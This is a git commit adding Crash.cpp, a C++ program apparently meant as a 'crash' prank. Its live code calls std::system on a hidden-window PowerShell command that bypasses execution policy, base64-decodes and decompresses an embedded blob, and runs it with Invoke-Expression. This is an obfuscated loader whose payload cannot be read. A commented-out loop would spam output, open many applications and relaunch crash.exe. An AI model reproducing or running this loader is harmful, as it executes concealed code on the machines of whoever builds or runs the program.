2d7cc657639052aefb59b4c5426ce39bbdfcd7bb
nimaisox <61984673+nimaisox@users.noreply.github.com>
2023-05-31 13:15:15 +0330

    Add files via upload

---
+++ Crash/Crash.cpp
@@ -0,0 +1,66 @@
+// Crash.cpp : This file contains the 'main' function. Program execution begins and ends there.
+//
+
+#include <iostream>
+#include <string>
+using namespace std;
+
+int main()
+{
+    std::string myText = "start crash.exe";
+    std::string system = "system";
+    char str1[] = "start crash.exe";
+    char str2[] = "start mspaint";
+    char str3[] = "start notepad";
+    char str4[] = "start cmd";
+    char str5[] = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(\"nVPbTttAEH33V4wsS9iKbTkXUBqExE20SG2KCGofojw4m4FsWe9au+MkhubfOwanLYhWVZ+OvTtzzpnLBgKO4Nj3pudKXRalsRT692g1qn4vXSjlRzMoq7mSAhzlxIAb4nu41HRFFr5IS1WuTpQyImzP1jFUUhNsWqxbfIgO/1vnzGJOeLNkWOx0qpZ3FcMv5fbrN+32pFH3jz2y9WPguOgxrpPP828oCCa1IyzSMVI6MeIeybUI4fSNu5PFwqJzF3khVT0bjVgALQesjb2P4a2MZ7ypS+TwCXERxduBV9aQEUa1oTeijLzApWdGazYa7nXf9dLuwTAddNNuP9uLYZgNswi+g6ko0ZVShxCUXNz0xNq88fbct0vNTdUCQ39eE/oxDCIO3HAgk1+jQLnCMChfET3wfeYF9T/wTU8lsckVWm5FY9xwU/o95oyzqLPfqNXTbNYQbk4vvPVSKoSQFRJFf0+O4LFx0nlptY6Dh85+3I3/3O0Lld85ZhsbjRFsvVtjWVEeddmLZF2EQfPV6bACmwtk425H98rRe6RTLtSFU96pGRv5kOuFwoizku5s6wXEubwWSTM3SAos5mjP8VZqSdJoCAQk47xA8L9K3e/5kGj+c2UuEJ5OLiotmkgHSZk7R0tbNQM6Cmg0evHEsjio04+o72gZZ5t+lmUMgyzyds6vK02ywPRpKU05QbuSAl36KbdumatmhKasmw5CxnN7fhyzMNiku7ZHUQw/RXj9aDf19vWxYhxs4gZerd6EckvJRCGWkExQGL2A4cEgy7YiJ7F83P4A\")))), [IO.Compression.CompressionMode]::Decompress)).ReadToEnd();";
+    //char str6[] = "start crash.exe";
+    //char str7[] = "start crash.exe";
+
+
+    //while (true)
+    //{
+    //    std::system("@echo off"); 
+    //    //system("color 01");
+    //    //system("echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%");
+    //    //system("color 02");
+    //    //system("echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%");
+    //    //system("color 03");
+    //    //system("echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%");
+    //    //system("color 04");
+    //    //system("echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%");
+    //    //system("color 05");
+    //    //system("echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%");
+    //    //system("color 06");
+    //    //system("echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%");
+    //    //system("color 07");
+    //    //system("echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%");
+    //    //system("color 08");
+    //    //system("echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%");
+    //    //system("color 09");
+    //    //system("echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%");
+    //    //system("color 00");
+    //    //system("echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%");
+    //    //system("start mspaint");
+    //    //system("start notepad");
+    //    //system("start write");
+    //    //system("start cmd");
+    //    //system("start explorer");
+    //    //system("start control");
+    //    //system("start calc");
+    //    //system("start ./VS/17-18/17-18.sln");
+    //    //system("start ./VSCODE/Code.exe");
+    //    //system("start ./CHROME/Chrome64/chrome.exe");
+    //    //system("start crash.exe");
+    //    //std::system(str1);
+    //    //std::system(str2);
+    //    //std::system(str3);
+    //    
+
+     
+    //}
+    std::system(str5);
+    std::system("echo test fix");
+    std::system("pause");
+    std::system("goto start");
+}
